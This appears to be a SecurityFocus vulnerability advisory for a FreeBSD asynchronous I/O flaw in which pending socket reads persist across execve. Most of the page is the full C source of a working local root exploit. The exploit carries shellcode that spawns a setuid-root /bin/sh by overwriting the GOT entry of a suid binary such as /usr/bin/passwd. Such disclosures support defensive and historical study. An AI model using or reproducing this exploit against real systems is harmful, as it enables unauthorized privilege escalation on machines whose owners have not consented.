source: http://www.securityfocus.com/bid/3661/info

aio.h is a library implementing the POSIX standard for asynchronous I/O. Support for AIO may be enabled in FreeBSD by compiling the kernel with the VFS_AIO option. This option is not enabled in the default kernel configuration.

Under some circumstances, pending reads from an input socket may persist through a call to execve. Eventually the read will continue, and write to the memory space of the new process.

If a local user is able to create and execute a malicious program calling a suid program, it may be possible to overwrite arbitrary memory locations in the suid process with arbitrary data. This could immediately lead to escalated privileges. 

/* tao - FreeBSD Local AIO Exploit
 * 
 * http://elysium.soniq.net/dr/tao/tao.html
 *
 * 4.4-STABLE is vulnerable up to at least 28th October.
 *
 * (C) David Rufino <dr@soniq.net> 2001
 * All Rights Reserved.
 *
 ***************************************************************************
 * bug found 13/07/01
 *
 * Any scheduled AIO read/writes will generally persist through an execve.
 *
 * "options VFS_AIO" must be in your kernel config, which is not enabled
 * by default.
 *
 * It may be interesting to note that the FreeBSD team have known about this
 * bug for a long time. Just take a look at 'LINT'.
 *
 * get the GOT address of exit, from any suid bin, by doing:
 * $ objdump --dynamic-reloc bin | grep exit
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <aio.h>

char code[]=
	"\x31\xc0\x50\x50\xb0\x17\xcd\x80"
	"\x6a\x3b\x58\x99\x52\x89\xe3\x68\x6e\x2f\x73\x68"
	"\x68\x2f\x2f\x62\x69\x60\x5e\x5e\xcd\x80";

unsigned long GOT = 0x0804fe20;
char *execbin = "/usr/bin/passwd";

int
main (argc, argv)
	int			argc;
	char			**argv;
{
	int			fds[2], sdf[2];
	struct aiocb		cb, cb2;
	char			buf[128], d;

	if ((d = getopt (argc, argv, "g:e:")) != -1) {
		switch (d) {
		case 'g':
			GOT = strtoul (optarg, NULL, 16);
			break;
		case 'e':
			execbin = optarg;
			break;
		}
	}

	printf ("got address: %08lx\n", GOT);
	printf ("executable: %s\n", execbin);
	/*
	 * pipes are treated differently to sockets, with sockets the
	 * aiod gets notifyed, whereas with pipes the aiod starts
	 * immediately blocking in fo_read. This is a problem because
	 * after the execve the aiod is still using the old vmspace struct
	 * if you use pipes, which means the data doesnt actually get copied
	 */
	if (socketpair (AF_UNIX, SOCK_STREAM, 0, fds) < 0) {
		perror ("socketpair");
		return (EXIT_FAILURE);
	}

	if (socketpair (AF_UNIX, SOCK_STREAM, 0, sdf) < 0) {
		perror ("socketpair");
		return (EXIT_FAILURE);
	}

	if (fork() != 0) {
		close (fds[0]);
		close (sdf[0]);
		memset (&cb, 0, sizeof(cb));
		memset (&cb2, 0, sizeof(cb2));
		cb.aio_fildes = fds[1];
		cb.aio_offset = 0;
		cb.aio_buf = (void *)GOT;
		cb.aio_nbytes = 4;
		cb.aio_sigevent.sigev_notify = SIGEV_NONE;

		cb2.aio_fildes = sdf[1];
		cb2.aio_offset = 0;
		cb2.aio_buf = (void *)0xbfbfff80;
		cb2.aio_nbytes = sizeof(code);
		cb2.aio_sigevent.sigev_notify = SIGEV_NONE;
		if (aio_read (&cb2) < 0) {
			perror ("aio_read");
			return (EXIT_FAILURE);
		}
		if (aio_read (&cb) < 0) {
			perror ("aio_read");
			return (EXIT_FAILURE);
		}
		execl (execbin, "test", NULL);
	} else {
		close(fds[1]);
		close(sdf[1]);
		sleep(2);
		printf ("writing\n");
		write (sdf[0], code, sizeof(code));
		*(unsigned int *)buf = 0xbfbfff80;
		write (fds[0], buf, 4);
	}
	return (EXIT_SUCCESS);
}

/*
 * vim: ts=8
 */ 